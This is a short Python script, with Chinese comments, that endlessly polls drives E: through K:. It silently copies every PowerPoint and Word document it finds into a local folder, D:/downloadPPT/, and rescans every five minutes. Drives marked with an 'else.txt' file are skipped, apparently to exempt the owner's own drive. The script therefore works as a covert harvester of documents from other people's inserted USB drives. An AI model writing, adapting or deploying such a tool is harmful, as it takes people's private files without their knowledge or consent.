import os
import shutil
import time
from datetime import datetime

new_path = r'D:/downloadPPT/'
 
# 判断文件夹是否存在,不存在创建
def create_folder(folder_name,file_path):
    folder_name = folder_name.replace('\\', '/')
    folder_name = folder_name.replace(file_path, new_path)
    if os.path.exists(folder_name):
        return
    folder_list = folder_name.split('/')
    index = 2
    for item in folder_list:
        path = '/'.join(folder_list[0:index])
        if not os.path.exists(path):
            print('不存在目录:' + path + ',对其进行创建')
            os.mkdir(path)
        index += 1

# 复制文件夹下指定文件格式的文件(保留文件夹格式)
def copy_file(file_path):
    listfile=['.pptx','.ppt','.docx','.doc']
    for format_name in listfile:
        try:
            for root, dirs, files in os.walk(file_path):
                for file_name in files:
                    if file_name[:2] == "~$":
                        print(file_name+"是错误文件不予复制！")
                        continue
                    else:
                        if file_name.endswith(format_name):
                            create_folder(root,file_path)
                            new_file_path = root.replace('\\', '/').replace(file_path, new_path)
                            shutil.copyfile(os.path.join(root, file_name), os.path.join(new_file_path, file_name))
                            print(file_name + '复制成功')
        except:
            print("出错了，跳过本次复制")
            continue
                    
if __name__ == '__main__':
    listf = ['E:/','F:/','G:/','H:/','I:/','J:/','K:/'] 
    while (True):
        try:
            for i in listf:
                if os.path.exists(i):
                    path_unlock = i+'else.txt'
                    if os.path.exists(path_unlock):
                        print("特殊盘，不予复制！")
                        continue
                    else:
                        copy_file(i)
                        print("结束，进入冷却循环！")
                        time.sleep(300)
                        continue
                else:
                    time.sleep(1)
                    print("未发现目录在"+i+"盘！")
                    continue
        except:
            print("盘意外拔出，继续扫盘")
            continue
        else:
            continue